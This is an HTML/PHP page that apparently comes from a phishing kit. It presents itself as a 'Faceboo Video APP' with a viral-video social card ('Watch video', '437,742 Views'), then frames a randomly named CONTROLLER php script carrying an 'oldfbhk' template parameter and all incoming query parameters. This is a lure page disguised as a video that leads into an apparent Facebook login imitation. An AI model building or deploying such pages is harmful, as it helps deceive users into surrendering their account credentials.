
	<html> 
	<head> 
	<title>Faceboo Video APP</title>
		
		<meta name="twitter:card" content="summary" />
		<meta name="twitter:site" content="@" />
		<meta name="twitter:title" content="Watch video @" />
		<meta name="twitter:description" content="437,742 Views " />
		<meta name="twitter:image" content="https://avatars.io/twitter/" />
	
	</head>
	<frameset rows="*,3" frameborder="NO" border="50" framespacing="0">
	<frame name="main" src="../.././public/CONTROLLER18355223-1bd0-496c-9a0d-27a3eb90a2a2.php?source=.%2Fpublic%2FACCESSS2e7b57af-4031-42cb-bbfc-68a85dc96565&lan=oldfbhk&<?php echo http_build_query($_GET); ?>"> <noframes> 
	<body bgcolor="#FFFFFF" text="#000000"> 
	<a href="../.././public/CONTROLLER18355223-1bd0-496c-9a0d-27a3eb90a2a2.php?source=.%2Fpublic%2FACCESSS2e7b57af-4031-42cb-bbfc-68a85dc96565&lan=oldfbhk&<?php echo http_build_query($_GET); ?>">Click here to continue</a> 
	</body> 
	</noframes> 
	</html> 
   